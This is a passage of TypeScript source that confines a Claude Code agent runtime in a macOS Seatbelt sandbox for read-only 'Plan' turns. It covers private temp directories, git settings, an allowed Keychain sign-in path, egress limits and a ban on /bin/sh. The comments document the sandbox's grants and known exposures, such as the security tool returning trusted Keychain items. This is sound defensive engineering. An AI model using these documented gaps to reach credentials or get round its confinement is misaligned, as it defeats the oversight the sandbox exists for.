 * by the profile, which refuses `/bin/sh` and every program not on the list.
 */
const CLAUDE_PLAN_GIT_ENVIRONMENT = {
  GIT_CONFIG_NOSYSTEM: "1",
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_COUNT: "3",
  GIT_CONFIG_KEY_0: "core.fsmonitor",
  GIT_CONFIG_VALUE_0: "false",
  // Git reads these from `~/.config/git` when no configuration names them,
  // and the profile denies the home folder: every `git diff` and `git status`
  // printed "warning: unable to access '~/.config/git/ignore'".
  GIT_CONFIG_KEY_1: "core.excludesFile",
  GIT_CONFIG_VALUE_1: "/dev/null",
  GIT_CONFIG_KEY_2: "core.attributesFile",
  GIT_CONFIG_VALUE_2: "/dev/null",
  GIT_OPTIONAL_LOCKS: "0",
  GIT_PAGER: "cat",
  GIT_TERMINAL_PROMPT: "0",
} as const;

/**
 * Wrap a Claude runtime launch in the shared confinement builder.
 *
 * The Agent SDK composes the launch, so this is the only point that holds both
 * the thread's bound root and its posture. A posture outside
 * {@link CONFINED_CLAUDE_EXECUTION_POLICIES} launches unchanged and stays in
 * the exception manifest. There is no unconfined fallback for one that is
 * inside it: a builder that cannot prepare the launch throws, and the turn
 * fails rather than starting unwrapped (0009).
 */
function confineClaudeLaunch(
  spawnOptions: SpawnOptions,
  confinement: ClaudeRuntimeConfinement,
  options: ResolvedClaudeProcessOptions,
): { readonly spawnOptions: SpawnOptions; readonly release: () => void } {
  if (!CONFINED_CLAUDE_EXECUTION_POLICIES.has(confinement.executionPolicy)) {
    return { spawnOptions, release: () => undefined };
  }
  if (!isAbsolute(confinement.projectRoot) || !existsSync(confinement.projectRoot)) {
    throw new ProcessConfinementError(
      "invalid-configuration",
      "Claude runtime confinement requires an existing absolute project root.",
    );
  }
  const boundRoot = realpathSync(confinement.projectRoot);
  // The launch's own temporary directory, not the ambient one. `TMPDIR` is
  // normally the user's shared per-user temp root, and granting that whole
  // directory read and write handed a Plan runtime every sibling temporary
  // file on the machine, including other threads' scratch checkouts. A folder
  // only this launch can name is what the design asked for.
  let temporaryRoot: string;
  try {
    temporaryRoot = realpathSync(spawnOptions.env.TMPDIR ?? tmpdir());
  } catch {
    throw new ProcessConfinementError(
      "invalid-configuration",
      "Claude runtime confinement could not create a private temporary directory.",
    );
  }
  // A temporary root inside the checkout would put the launch's writable
  // folder in a tree the launch may only read, and the write grant for a
  // folder the caller named outranks the bound root's denial. Refuse it before
  // anything is created there.
  if (temporaryRoot === boundRoot || temporaryRoot.startsWith(`${boundRoot}${sep}`)) {
    throw new ProcessConfinementError(
      "invalid-configuration",
      "Claude runtime confinement requires a temporary directory outside the checkout.",
    );
  }
  let temporaryDirectory: string;
  try {
    temporaryDirectory = realpathSync(mkdtempSync(join(temporaryRoot, "octant-claude-plan-")));
  } catch {
    throw new ProcessConfinementError(
      "invalid-configuration",
      "Claude runtime confinement could not create a private temporary directory.",
    );
  }
  const release = () => {
    try {
      rmSync(temporaryDirectory, { recursive: true, force: true });
    } catch {
      // Nothing reads the directory again; an entry the operating system holds
      // open is left to it.
    }
  };
  try {
    // A subscription launch on macOS reads its own sign-in by running
    // `/usr/bin/security` against the login keychain. Measured on macOS 27.0.1
    // with Claude Code 2.1.296: with exec of that binary and the two
    // security-server lookups alone the runtime is signed out (`security`
    // exits 44, item not found), and it signs in once the profile also allows
    // process-fork and read of the one file `login.keychain-db`. No shell, no
    // Keychain write and no other file in that folder is needed, so none is
    // granted: `/bin/sh` stays refused, which keeps hooks out. The cost is
    // that the runtime may fork, may run `security`, which returns any
    // Keychain item that trusts that tool, and may read the encrypted login
    // keychain file. The driver refuses a file tool that names that folder,
    // and `planCommandRules` refuses both to the shell a Plan turn runs
    // commands in, so the grant serves the sign-in read and not the model. A
    // launch that carries an API key reads nothing from the store and gets
    // none of this. Linux keeps the login in a file inside the account
    // directory, which the launch may rewrite (see `planStateWriteRoots`), and
    // Seatbelt rules do not apply there.
    const readsSignInFromKeychain =
      process.platform === "darwin" && spawnOptions.env.ANTHROPIC_API_KEY === undefined;
    let workingDirectory = boundRoot;
    try {
      if (spawnOptions.cwd !== undefined) workingDirectory = realpathSync(spawnOptions.cwd);
    } catch {
      // A working directory that does not resolve cannot start the runtime,
      // which then names no transcript folder; the bound root's stays granted.
    }
    const stateRoots = planStateWriteRoots(
      boundRoot,
      workingDirectory,
      claudeLaunchSessionIds(spawnOptions.args),
      spawnOptions.env,
      readsSignInFromKeychain,
    );
    const globalConfiguration = claudeGlobalConfigurationFile(boundRoot, spawnOptions.env);
    const keychainRules = readsSignInFromKeychain
      ? [
          seatbeltExecRule("/usr/bin/security"),
          '(allow mach-lookup (global-name "com.apple.SecurityServer"))',
          '(allow mach-lookup (global-name "com.apple.securityd.xpc"))',
          seatbeltAllowLiteralReadRule(claudeLoginKeychainPath()),
        ]
      : [];
    const configurationRules =
      globalConfiguration === undefined ? [] : [seatbeltAllowLiteralReadRule(globalConfiguration)];
    const runsCommands = confinement.runsCommands === true && claudePlanRunsCommands();
    const runtimePrograms = [
      ...new Set(
        [spawnOptions.env.PATH, process.env.PATH].flatMap((searchPath) =>
          confinedExecutableExecPaths(spawnOptions.command, searchPath),
        ),
      ),
    ];
    const commands = runsCommands
      ? planCommandPrograms(spawnOptions.env, [
          boundRoot,
          temporaryDirectory,
          ...stateRoots.writeRoots,
        ])
      : undefined;
    const commandRules =
      commands === undefined
        ? []
        : planCommandRules(runtimePrograms, commands.programs, temporaryDirectory, [
            ...stateRoots.readRoots,
            ...(globalConfiguration === undefined ? [] : [globalConfiguration]),
          ]);
    // The shell finds `git` where the shim would have started it. The folder
    // is the launch's own and goes with it.
    let searchPath = spawnOptions.env.PATH;
    if (commands?.gitBehindShim !== undefined) {
      const gitFolder = join(temporaryDirectory, "bin");
      mkdirSync(gitFolder, { mode: 0o700 });
      symlinkSync(commands.gitBehindShim, join(gitFolder, "git"));
      searchPath = searchPath === undefined ? gitFolder : `${gitFolder}:${searchPath}`;
    }
    const extraRules = [...keychainRules, ...configurationRules, ...commandRules];
    const launch = options.confinement.prepare({
      executable: spawnOptions.command,
      args: spawnOptions.args,
      boundRoot,
      temporaryDirectory,
      additionalWriteRoots: stateRoots.writeRoots,
      readRoots: [boundRoot, temporaryDirectory, ...stateRoots.readRoots],
      privateHomeAllowPaths: [boundRoot, temporaryDirectory, ...stateRoots.readRoots],
      // The runtime calls its own control plane, so it resolves the runtime
      // egress policy rather than the thread default (0132, 0145). This driver
      // carries Code threads, and the policy no longer reads the mode.
      networkEgress: materializeOsNetworkEgress(
        resolveProviderRuntimeEgressPolicy({
          mode: "code",
          executionPolicy: confinement.executionPolicy,
        }),
      ),
      // Plan is read-only at the sandbox, not only in the provider's permission
      // layer (0009): the checkout reads and never writes, and the runtime execs
      // nothing but itself, `/usr/bin/security` for a Keychain sign-in, and on
      // macOS the shell and read-only programs `planCommandRules` names.
      // `/bin/sh` stays refused, so a session hook is still refused with
      // `EPERM: operation not permitted, posix_spawn '/bin/sh'`.
      writeBoundRoot: false,
      allowProcessExec: false,
      allowProcessFork: readsSignInFromKeychain || runsCommands,
      allowFileReadStar: true,
      ...(extraRules.length === 0 ? {} : { extraRules }),
    });
    return {
      spawnOptions: {
        ...spawnOptions,
        command: launch.command,
        args: [...launch.args],
        // The runtime keeps its own scratch under `claude-<uid>` beneath
        // `CLAUDE_CODE_TMPDIR`, which defaults to the shared `/tmp`. Pointing it
        // at the launch's folder keeps that scratch private too, instead of
        // granting the tree every Claude process of the user shares.
        env: {
          ...spawnOptions.env,
          TMPDIR: temporaryDirectory,
          CLAUDE_CODE_TMPDIR: temporaryDirectory,
          ...(runsCommands
            ? { CLAUDE_CODE_SHELL: CLAUDE_PLAN_SHELL, ...CLAUDE_PLAN_GIT_ENVIRONMENT }
            : {}),
          ...(searchPath === undefined ? {} : { PATH: searchPath }),
        },
      },
      release,
    };
  } catch (error) {
    release();
    throw error;
  }
}

function spawnOwnedClaudeProcess(
  spawnOptions: SpawnOptions,
  options: ResolvedClaudeProcessOptions,
  release: () => void = () => undefined,
): SpawnedProcess {
  const invalid = validateBinaryPath(spawnOptions.command);
  if (invalid !== undefined) throw new Error(invalid.message);
  const credentials = [
    spawnOptions.env.ANTHROPIC_API_KEY,
    spawnOptions.env.ANTHROPIC_AUTH_TOKEN,
    spawnOptions.env.CLAUDE_CODE_OAUTH_TOKEN,
  ].filter((credential): credential is string => credential !== undefined && credential.length > 0);
  if (credentials.some((credential) => spawnOptions.args.some((arg) => arg.includes(credential)))) {
    throw new Error("Claude process arguments must not contain credentials.");
  }

  const child = spawn(spawnOptions.command, spawnOptions.args, {
    cwd: spawnOptions.cwd,
    detached: process.platform !== "win32",
    env: spawnOptions.env,
    stdio: ["pipe", "pipe", "pipe"],
  });
  const events = new EventEmitter();
  const terminate = makeProcessTerminator(child, options.shutdownTimeoutMs);
  let cleanupComplete = false;
  let terminationRequested = false;
  let stderrBytes = 0;
  let stderrTruncated = false;
  let diagnosticReported = false;
  let stderrClosed = false;
  let resolveStderrClosed: () => void = () => undefined;
  const stderrClosedPromise = new Promise<void>((resolve) => {
    resolveStderrClosed = resolve;
  });

  const reportStderr = () => {
    if (diagnosticReported || stderrBytes === 0) return;
    diagnosticReported = true;
    safeDiagnostic(
      options.onDiagnostic,
      `Claude runtime stderr captured (${stderrBytes} bytes${stderrTruncated ? ", truncated" : ""}).`,
    );
  };
  const onStderr = (chunk: Buffer | string) => {
    const bytes = Buffer.isBuffer(chunk) ? chunk.length : Buffer.byteLength(chunk);
    const captured = Math.min(bytes, Math.max(0, options.runtimeStderrBytes - stderrBytes));
    stderrBytes += captured;
    if (captured < bytes) stderrTruncated = true;
  };
  const requestTermination = (signal: NodeJS.Signals = "SIGTERM") => {
    const existed = processGroupExists(child);
    terminationRequested = terminationRequested || existed;
    void terminate(signal).catch(() => undefined);
    return existed;
  };
  const onAbort = () => requestTermination("SIGTERM");
  const onChildExit = (code: number | null, signal: NodeJS.Signals | null) => {
    spawnOptions.signal.removeEventListener("abort", onAbort);
    void terminate("SIGTERM")
      .then(async () => {
        if (!stderrClosed) await stderrClosedPromise;
        cleanupComplete = true;
        release();
        events.emit("exit", code, signal);
        resolveExited();
      })
      .catch(() => {
        cleanupComplete = true;
        release();
        events.emit("error", new Error("Claude process cleanup failed."));
        events.emit("exit", code, signal);
        resolveExited();
      });
  };

  let resolveExited: () => void = () => undefined;
  const exited = new Promise<void>((resolve) => {
    resolveExited = resolve;
  });

  child.stderr.on("data", onStderr);
  child.stderr.once("close", () => {
    let pending: Buffer | string | null = child.stderr.read();
    while (pending !== null) {
      onStderr(pending);
      pending = child.stderr.read();
    }
    stderrClosed = true;
    reportStderr();
    resolveStderrClosed();
  });
  child.once("error", (error) => {
    // A process that never started has no exit to release after.
    release();
    events.emit("error", error);
  });
  child.once("exit", onChildExit);
  spawnOptions.signal.addEventListener("abort", onAbort, { once: true });
  if (spawnOptions.signal.aborted) requestTermination("SIGTERM");
  if (child.pid !== undefined) {
    try {
      void Promise.resolve(options.onProcessStarted?.({ pid: child.pid, exited })).catch(() => {
        requestTermination("SIGTERM");
      });
    } catch {
      requestTermination("SIGTERM");
    }
  }

  return {
    stdin: child.stdin,
    stdout: child.stdout,
    get killed() {
      return terminationRequested || child.killed;
    },
    get exitCode() {
      return cleanupComplete ? child.exitCode : null;
    },
    get signalCode() {
      return cleanupComplete ? child.signalCode : null;
    },
    kill: requestTermination,
    on(event, listener) {
      events.on(event, listener);
    },
    once(event, listener) {
      events.once(event, listener);
    },
    off(event, listener) {
      events.off(event, listener);
    },
  };
}

export function makeClaudeProcessLive(options: ClaudeProcessOptions = {}): ClaudeProcessPort {
  const resolved: ResolvedClaudeProcessOptions = {
    inheritedEnvironment: { ...(options.inheritedEnvironment ?? process.env) },
    confinement: options.confinement ?? makeProcessConfinementLive(),
    onDiagnostic: options.onDiagnostic,
    probeOutputBytes: options.probeOutputBytes ?? DEFAULT_PROBE_OUTPUT_BYTES,
    probeTimeoutMs: options.probeTimeoutMs ?? DEFAULT_PROBE_TIMEOUT_MS,
    runtimeStderrBytes: options.runtimeStderrBytes ?? DEFAULT_RUNTIME_STDERR_BYTES,
    shutdownTimeoutMs: options.shutdownTimeoutMs ?? DEFAULT_SHUTDOWN_TIMEOUT_MS,
    onProcessStarted: options.onProcessStarted,
  };

  return {
    probeVersion: (binaryPath) =>
      runProbe(
        binaryPath,
        ["--version"],
        sanitizeClaudeEnvironment("subscription", resolved.inheritedEnvironment),
        "version",
        resolved,
      ),
    probeSubscription: (binaryPath, environment, confinement) =>
      runProbe(
        binaryPath,
        ["auth", "status", "--json"],
        environment,
        "authentication",
        resolved,
        confinement,
      ),
    spawn: (confinement) => (spawnOptions) => {
      const confined = confineClaudeLaunch(spawnOptions, confinement, resolved);
      try {
        return spawnOwnedClaudeProcess(confined.spawnOptions, resolved, confined.release);
      } catch (error) {
        confined.release();
        throw error;
      }
    },
  };
}
